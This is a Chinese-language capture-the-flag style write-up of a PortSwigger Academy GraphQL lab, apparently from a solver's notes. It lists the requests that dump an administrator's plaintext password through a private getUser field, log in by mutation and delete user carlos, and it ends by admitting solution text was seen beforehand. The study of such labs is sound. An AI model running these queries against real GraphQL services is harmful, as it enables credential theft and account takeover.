---
title: "lab-graphql-accidental-field-exposure"
links:
  - target: graphql-family
    relation: evidences
---

# lab-graphql-accidental-field-exposure

> evidences: [[graphql-family]]

- 题面:Accidental exposure of private GraphQL fields(/web-security/graphql/lab-graphql-accidental-field-exposure)
- 实例:https://0a76000104cdf8d880fe2120001c00c2.web-security-academy.net
- 判定目标:以 administrator 登录并删除 carlos

## 关键步

1. 端点:`POST /graphql/v1` 有效;`/graphql` → 404;`GET /graphql/v1?...` → 405(仅 POST)。
2. 普适查询:`POST {"query":"query{__typename}"}` → `{"data":{"__typename":"query"}}`。
3. introspection:`{"query":"{__schema{types{name}}}"}` 列出类型(注意 JSON 体需转义内层引号;直连 GET 不可用)。
4. 私有字段直取:`{"query":"{getUser(id:1){id username password}}"}` → 明文口令 `c9dwf9w3f16i4f2kl580`。
5. 登录面:登录页表单无 action,`onsubmit=gqlLogin`,`loginGql.js` 显示 `mutation login($input: LoginInput!){login(input:$input){token success}}`;`POST /login` 表单 → 405。
6. 登录 mutation:`{"query":"mutation login($input: LoginInput!){login(input:$input){token success}}","variables":{"input":{"username":"administrator","password":"c9dwf9w3f16i4f2kl580"}}}` → `token` + 响应同时 `Set-Cookie: session=<token>`(jar 自动吸收)。
7. 收尾:带新会话 `GET /admin` → 用户表;`GET /admin/delete?username=carlos` → 302 回 `/admin`。

## 交册值

administrator / `c9dwf9w3f16i4f2kl580`(经 `getUser` 私有字段外泄),登录后删除 carlos。

## 证据摘录

```
POST /graphql/v1  {"query":"{getUser(id:1){id username password}}"}
   -> {"data":{"getUser":{"id":1,"username":"administrator","password":"c9dwf9w3f16i4f2kl580"}}}
POST /graphql/v1  mutation login... -> {"data":{"login":{"token":"wazGOGM56CiTCjf9rBBieHhC8gBFJkPn","success":true}}}
   Set-Cookie: session=wazGOGM56CiTCjf9rBBieHhC8gBFJkPn
GET /admin        -> 200,用户表含 "carlos /admin/delete?username=carlos"
GET /admin/delete?username=carlos -> 302 /admin
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure" --out /tmp/g2-page-stripped.html   # 剥离 solution,回 lab_id
lab_launch launch <lab_id> --widget-source /web-security/graphql/lab-graphql-accidental-field-exposure --jar /tmp/mar-jar.json
lab_http post "<inst>/graphql/v1" --header 'Content-Type: application/json' \
  --body '{"query":"{getUser(id:1){id username password}}"}' --jar /tmp/mar-jar.json
lab_http post "<inst>/graphql/v1" --header 'Content-Type: application/json' \
  --body '{"query":"mutation login($input: LoginInput!){login(input:$input){token success}}","variables":{"input":{"username":"administrator","password":"<pw>"}}}' --jar /tmp/mar-jar.json
lab_http get "<inst>/admin" --jar /tmp/mar-jar.json
lab_http get "<inst>/admin/delete?username=carlos" --follow --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

## 独立性如实标注

规则更正(禁读题解)前,抓页/摘要步骤读到了题页 solution 片段(如「login 是 GraphQL mutation」「administrator 的 id 是 1」)。`getUser(id:1){password}` 的方向与题解一致,不能排除受其影响;每步仍以实例响应实证。
